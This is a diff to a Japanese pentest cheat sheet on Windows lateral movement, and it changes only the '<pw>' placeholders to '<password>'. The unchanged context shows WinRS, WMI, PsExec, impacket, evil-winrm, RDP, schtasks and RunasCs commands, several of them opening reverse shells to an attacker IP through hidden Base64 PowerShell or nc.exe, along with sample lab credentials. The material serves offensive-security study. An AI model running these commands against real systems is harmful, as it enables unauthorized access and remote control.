@@ -28,7 +28,7 @@
 ```powershell
 # 認証情報オブジェクトの作成
 $username = '<domain\username>';
-$password = '<pw>';
+$password = '<password>';
 $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
 $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
 ```
@@ -62,7 +62,7 @@ Invoke-Command -ComputerName <target_IP> -Credential $credential -ScriptBlock {
 
 基本コマンド
 ```powershell
-winrs -r:<target_IP> -u:<username> -p:<pw> "<command>"
+winrs -r:<target_IP> -u:<username> -p:<password> "<command>"
 ```
 
 具体例
@@ -73,7 +73,7 @@ winrs -r:files04 -u:jen -p:Nexus123! "cmd /c hostname & whoami"
 リバースシェルの実行
 	[Base64化したPowerShellリバースシェルワンライナー](../../Common/What%20is%20the%20shell.md#Base64化したPowerShellリバースシェルワンライナー)
 ```cmd
-winrs -r:<target_IP> -u:<username> -p:<pw> "powershell -nop -w hidden -e <Base64EncodedPayload>"
+winrs -r:<target_IP> -u:<username> -p:<password> "powershell -nop -w hidden -e <Base64EncodedPayload>"
 ```
 
 ## 2. WMIによる横展開・永続化
@@ -94,7 +94,7 @@ CIMセッションの作成
 ```powershell
 # 認証情報オブジェクトの作成
 $username = '<username>';
-$password = '<pw>';
+$password = '<password>';
 $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
 $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
 
@@ -142,7 +142,7 @@ Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Creat
     - ✅シンプルな方法でコマンドを実行可能
     - ❌プロセスはSession 0で実行され、システムサービス専用セッションであるため、GUIは表示されない
 ```cmd
-wmic /node:<target_IP> /user:<username> /password:<pw> process call create "<command>"
+wmic /node:<target_IP> /user:<username> /password:<password> process call create "<command>"
 ```
 
 ### (b) 悪意あるスケジュールタスクの作成
@@ -258,13 +258,13 @@ PsExecはWindows sysinternalsスイートの１つで、telnetのように、管
 2. リモートのマシンで任意のコマンドを実行する
 ```powershell
 # 例：.\PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd
-.\PsExec64.exe -i \\<TargetHost | IP> -u <domain>\<username> -p '<pw>' cmd
+.\PsExec64.exe -i \\<TargetHost | IP> -u <domain>\<username> -p '<password>' cmd
 ```
 
 ## リモートからPsExecを実行する場合
 
 ```zsh
-impacket-psexec '<domain>/<user>:<pw>@<target_IP>' cmd
+impacket-psexec '<domain>/<user>:<password>@<target_IP>' cmd
 ```
 
 ---
@@ -552,10 +552,10 @@ wget https://raw.githubusercontent.com/antonioCoco/RunasCs/refs/heads/master/Inv
 ```powershell
 Import-Module .\Invoke-RunasCs.ps1
 
-Invoke-RunasCs -Username <username> -Password <pw> '<cmd>'
+Invoke-RunasCs -Username <username> -Password <password> '<cmd>'
 
 # リバースシェル取得
-Invoke-RunasCs -Username <username> -Password <pw> [-Domain <string>] -Command powershell.exe -Remote <attacker_IP>:<Port>
+Invoke-RunasCs -Username <username> -Password <password> [-Domain <string>] -Command powershell.exe -Remote <attacker_IP>:<Port>
 
 # 具体例：Invoke-RunasCs -Username svc_mssql -Password trustno1 'c:/xampp/htdocs/uploads/nc.exe 192.168.118.23 4444 -e cmd.exe'
 ```
@@ -566,10 +566,10 @@ wget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip
 ```
 ```powershell
 # リバースシェル取得
-.\RunasCs.exe <username> <pw> cmd.exe -r <attacker_IP>:<Port> -l <logon_type> -b
+.\RunasCs.exe <username> <password> cmd.exe -r <attacker_IP>:<Port> -l <logon_type> -b
 
 # 任意コマンド
-.\RunasCs.exe <username> <pw> <command> -l <logon_type> -b
+.\RunasCs.exe <username> <password> <command> -l <logon_type> -b
 ```
 - `-b`, `--bypass-uac`：プロセスにUACの制限がかからないように試行する
 
@@ -593,7 +593,7 @@ wget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip
 
 攻撃者のマシンから
 ```zsh
-evil-winrm -i <target_IP> -u '[domain\]<username>' -p '<pw>'
+evil-winrm -i <target_IP> -u '[domain\]<username>' -p '<password>'
 ```
 
 ### RDP
@@ -602,7 +602,7 @@ evil-winrm -i <target_IP> -u '[domain\]<username>' -p '<pw>'
 	- TCP 3389がopenであること
 	- ターゲットユーザーが`Remote Desktop Users`グループ所属
 ```zsh
-xfreerdp3 /dynamic-resolution +clipboard /cert:ignore /v:<target_IP> /u:<username> /p:'<pw>'
+xfreerdp3 /dynamic-resolution +clipboard /cert:ignore /v:<target_IP> /u:<username> /p:'<password>'
 ```
 
 ### スケジュールタスクの作成（schtasks）
@@ -610,7 +610,7 @@ xfreerdp3 /dynamic-resolution +clipboard /cert:ignore /v:<target_IP> /u:<usernam
 - 条件
 	- ターゲットユーザーが`Log on as a batch job`（SeBatchLogonRight ）を持っていること
 ```cmd
-schtasks /Create /RU <username> /RP <pw> /SC ONCE /TN mytask /TR "cmd.exe /c <cmd>" /ST 12:00 schtasks /Run /TN mytask
+schtasks /Create /RU <username> /RP <password> /SC ONCE /TN mytask /TR "cmd.exe /c <cmd>" /ST 12:00 schtasks /Run /TN mytask
 ```
 
 ### PsExec（Sysinternals）
@@ -619,5 +619,5 @@ schtasks /Create /RU <username> /RP <pw> /SC ONCE /TN mytask /TR "cmd.exe /c <cm
 	- port 445（SMB）がopenであること
 	- ターゲットユーザーにadmin権限があること（ADMIN$共有へのwrite権限が必要）
 ```zsh
-impacket-psexec <domain/username>:<pw>@<target_IP>
+impacket-psexec <domain/username>:<password>@<target_IP>
 ```
